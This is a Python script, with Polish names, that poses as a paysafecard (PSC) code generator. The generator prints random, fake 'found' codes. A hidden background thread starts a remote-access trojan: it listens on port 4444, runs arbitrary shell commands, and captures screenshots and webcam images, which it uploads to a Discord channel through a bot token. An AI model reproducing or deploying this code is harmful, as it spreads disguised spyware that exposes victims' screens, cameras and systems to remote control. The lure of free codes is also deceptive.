import socket
import pyautogui
import cv2
import os
import requests
import random
import time
import pygame
from colorama import Fore, Style, init
import threading

HOST = '127.0.0.1'
PORT = 4444

DISCORD_BOT_TOKEN = 'TOKEN_BOTA'
DISCORD_CHANNEL_ID = 'ID_KANAŁU_DC'

init()
pygame.init()
wygenerowane_kody = set()
znalezione = 0
total = 0

def send_to_discord(file_path):
    url = f"https://discord.com/api/v9/channels/{DISCORD_CHANNEL_ID}/messages"
    headers = {"Authorization": f"Bot {DISCORD_BOT_TOKEN}"}
    with open(file_path, 'rb') as file:
        requests.post(url, headers=headers, files={'file': file})

def rat_server():
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()

    while True:
        try:
            cmd = conn.recv(1024).decode()

            if cmd == '1':
                break
            elif cmd == '2':
                img = pyautogui.screenshot()
                img.save('screen.png')
                send_to_discord('screen.png')
                os.remove('screen.png')
            elif cmd == '3':
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                cam.release()
                cv2.imwrite('cam.jpg', frame)
                send_to_discord('cam.jpg')
                os.remove('cam.jpg')
            else:
                result = os.popen(cmd).read()
                conn.send(result.encode())
        except Exception:
            break

    conn.close()
    s.close()

def generuj_kod_psc():
    while True:
        kod = '-'.join(f"{random.randint(0, 9999):04d}" for _ in range(4))
        if kod not in wygenerowane_kody:
            wygenerowane_kody.add(kod)
            return kod

def zapisz_kod(kod, znalezione):
    sciezka_folderu = r'C:\Users\Franek\Desktop\składzik'
    plik = os.path.join(sciezka_folderu, 'kody psc.txt')
    try:
        with open(plik, 'a', encoding='utf-8') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {kod}  :${znalezione}$\n")
        return True
    except Exception as e:
        print(f"{Fore.RED}Błąd zapisu: {e}{Style.RESET_ALL}")
        return False

def psc_generator():
    global znalezione, total
    print("=== GENERATOR PSC ===")
    print("[STATUS]    [KOD PSC]          [LICZNIK]")
    print("----------------------------------------")
    czas = pygame.time.Clock()
    fps = 99999999

    try:
        while True:
            czas.tick(fps)
            kod = generuj_kod_psc()
            trafienie = random.random() < 0.00000001
            total += trafienie
            if trafienie:
                znalezione = random.randint(1, 364)
                print(f"{Fore.GREEN}found :{kod}:${znalezione}:{total}{Style.RESET_ALL}")
                zapisz_kod(kod, znalezione)
            else:
                print(f"{Fore.MAGENTA}not found :{kod}:$0:{Style.RESET_ALL}")
    except KeyboardInterrupt:
        print("\n=== PODSUMOWANIE ===")
        podsumowanie = f"Znaleziono: {Fore.YELLOW}{znalezione}{Style.RESET_ALL} / {total}"
        print(podsumowanie)

if __name__ == "__main__":
    threading.Thread(target=rat_server, daemon=True).start()
    psc_generator()
